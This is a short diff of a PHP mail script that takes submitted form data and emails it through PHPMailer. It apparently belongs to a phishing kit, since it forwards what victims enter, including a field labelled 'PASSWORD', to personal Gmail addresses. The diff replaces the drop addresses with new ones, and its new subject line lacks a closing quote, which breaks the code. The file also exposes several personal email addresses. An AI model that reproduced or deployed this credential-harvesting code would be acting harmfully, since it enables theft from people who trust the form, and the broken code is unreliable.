@@ -35,14 +35,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email properties
         $mail->addAddress('rutherfordhenress@gmail.com', 'PASSWORD');
-        $mail->addAddress('approval.ads.monica.ramey@gmail.com');
-        $mail->addAddress('zubairnizamani1234567@gmail.com');
+        $mail->addAddress('subhannizamani51@gmail.com');
+        $mail->addAddress('i4972892@gmail.com');
 
       // Email recipient's address
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'ZUBAIR';
+        $mail->Subject = 'RASHID
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
